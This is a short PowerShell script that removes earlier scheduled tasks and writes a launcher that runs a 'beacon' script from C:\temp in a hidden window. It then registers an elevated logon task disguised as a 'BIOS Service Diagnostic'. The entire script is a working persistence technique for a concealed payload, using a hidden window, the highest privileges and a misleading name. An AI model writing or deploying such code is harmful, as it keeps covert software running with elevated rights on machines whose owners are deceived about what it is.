Unregister-ScheduledTask -TaskName "BIOS Utility" -Confirm:$false
Unregister-ScheduledTask -TaskName "BLACK FRIDAY Task (One-Time)" -Confirm:$false

$script = @"
Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\elevate\GetState.ps1}"' -PassThru | Out-Null
"@
$script | Out-File -FilePath "C:\temp\NewProcess.ps1" -Encoding ascii
C:\temp\NewProcess.ps1

$scriptPath = "C:\temp\NewProcess.ps1"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BIOS NewProcess" -Description "BIOS Service Diagnostic" -RunLevel Highest -Force